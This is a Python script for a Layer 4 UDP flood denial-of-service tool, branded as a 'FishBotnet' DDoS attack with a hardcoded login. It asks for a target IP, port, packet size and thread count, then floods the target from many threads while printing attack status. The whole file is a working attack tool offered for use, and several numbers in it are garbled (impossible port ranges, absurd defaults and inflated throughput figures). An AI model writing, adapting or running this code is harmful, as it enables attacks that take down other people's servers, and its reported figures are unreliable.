from threading import Thread
from random import choices, randint
from time import time, sleep
from pystyle import *
from getpass import getpass as hinput
from socket import socket, AF_INET, SOCK_DGRAM
def login():
    # Định nghĩa tên người dùng và mật khẩu
    username = "FishBotnet"
    password = "14082004"
    # Yêu cầu người dùng nhập tên người dùng và mật khẩu
    input_username = input("Username ->:  ")
    input_password = input("Password ->: ")
    # Kiểm tra thông tin đăng nhập
    if input_username == username and input_password == password:
        print("Đăng Nhập Thành Công!")
    else:
        print("Đăng Nhập Thất Bại | Không Có Tác Dụng|")
login()
class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # self.data = self._randbytes()
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)
    def flood(self):
        self.on = True
        self.sent = 100
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    def info(self):
        interval = 0.05
        now = time()
        size = 500000000000000000000000000000
        self.total = 10000000000000000000000000000000
        bytediff = 80000000000000000000000000000
        mb = 1000000000000000000000000000000
        gb = 10000000000000000000000000000000
        while self.on:
            sleep(interval)
            if not self.on:
                break
            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"GB/s : {round(self.total, 4)} {' '*20}"), end='\r')
            now2 = time()
            if now + 1 >= now2:
                continue
            size = round(self.sent * bytediff / mb)
            self.sent = 10
            now += 1
    def stop(self):
        self.on = False
    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())
    def _randport(self):
        return self.port or randint(10, 65585858585835)
ascii = r'''
  █████▒██▓  ██████  ██░ ██  ▄▄▄▄    ▒█████  ▄▄▄█████▓ ███▄    █ ▓█████▄▄▄█████▓
▓██   ▒▓██▒▒██    ▒ ▓██░ ██▒▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▒████ ░▒██▒░ ▓██▄   ▒██▀▀██░▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
░▓█▒  ░░██░  ▒   ██▒░▓█ ░██ ▒██░█▀  ▒██   ██░░ ▓██▓ ░ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
░▒█░   ░██░▒██████▒▒░▓█▒░██▓░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
 ▒ ░   ░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
 ░      ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░▒░▒   ░   ░ ▒ ▒░     ░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
 ░ ░    ▒ ░░  ░  ░   ░  ░░ ░ ░    ░ ░ ░ ░ ▒    ░         ░   ░ ░    ░    ░      
        ░        ░   ░  ░  ░ ░          ░ ░                    ░    ░  ░        
                                  ░                                             
                                  DDoS Layer4 By Virus'''
banner = r"""
 .""".replace('▓', '▀')
banner = Add.Add(ascii, banner, center=True)
fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white
blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black))
purple = Col.StaticMIX((Col.purple, Col.white))
def init():
    System.Size(14940, 40050)                                                                                                                                                                                                                                                                   ,System.Title(".B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.".replace('.',''))
    Cursor.HideCursor()
init()
def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, '{root@Fish}')} {col2}{text}"
def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('?', fluo, white)} {fluo}{text}")
    exit()
def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
    ip = input(stage(f"Server  ", '-> '))
    print()
    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Error.")
    port = input(stage(f"Port  ", '-> '))
    print()
    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error.")
    force = input(stage(f"Request ", '-> '))
    print()
    if force == '':
        force = 5000000000000000000000
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error.")
    threads = input(stage(f"Threads ", '-> '))
    print()
    if threads == '':
        threads = 500000000000000000000000
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error.")
    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Attacking {fluo2}{ip}{cport}{white}."), end='\r')
    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("stop.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Attack stop {fluo2}{ip}{cport}{white} {fluo}{round(brute.total, 1)} {white}", '.'))
    print('\n')
    sleep(1)
    hinput(stage(f"{fluo2}enter{white}{fluo}exit{white}.", '.'))
if __name__ == '__main__':
    main()    